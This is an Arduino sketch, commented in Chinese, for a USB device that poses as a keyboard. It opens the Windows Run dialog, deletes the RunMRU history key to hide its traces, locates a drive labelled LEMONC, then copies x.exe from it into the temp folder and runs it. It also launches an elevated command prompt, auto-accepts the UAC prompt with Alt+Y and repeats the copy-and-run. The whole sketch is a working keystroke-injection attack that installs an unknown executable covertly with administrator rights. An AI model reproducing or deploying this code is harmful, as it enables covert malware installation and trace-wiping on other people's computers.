void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd /k reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(500);
  Keyboard.println("for /f %a in (\'wmic volume get driveletter^,label ^| Find \"LEMONC\"\') do (set ab=%a)");
  delay(100);
  Keyboard.println("copy /y %ab%\\x.exe %tmp%&%tmp%\\x.exe&exit");
  delay(1000);
    Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("powershell -c start-process -Filepath cmd \' /k reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f\'-verb runas");
  delay(3000);
 Keyboard.press(KEY_LEFT_ALT);
 Keyboard.print('y');
 Keyboard.release(KEY_LEFT_ALT);
 delay(1000);
 Keyboard.println("for /f %a in (\'wmic volume get driveletter^,label ^| Find \"LEMONC\"\') do (set ab=%a)");
 delay(500);
 Keyboard.println("copy /y %ab%\\x.exe %tmp%&%tmp%\\x.exe&exit");
 Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
